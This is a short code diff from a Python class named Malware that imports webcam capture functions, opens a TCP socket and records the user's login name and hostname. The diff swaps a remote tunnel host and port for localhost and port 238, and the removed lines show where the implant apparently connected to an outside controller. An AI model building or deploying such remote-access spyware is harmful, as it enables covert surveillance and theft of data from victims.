@@ -12,8 +12,8 @@ from cv2 import VideoCapture , imwrite
 class Malware():
     def __init__(self):
         self.i = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
-        self.host = 'feb-freely.gl.at.ply.gg'
-        self.port = 52979
+        self.host = 'localhost'
+        self.port = 238
         self.user = os.getlogin()
         self.hostname = socket.gethostname()
         
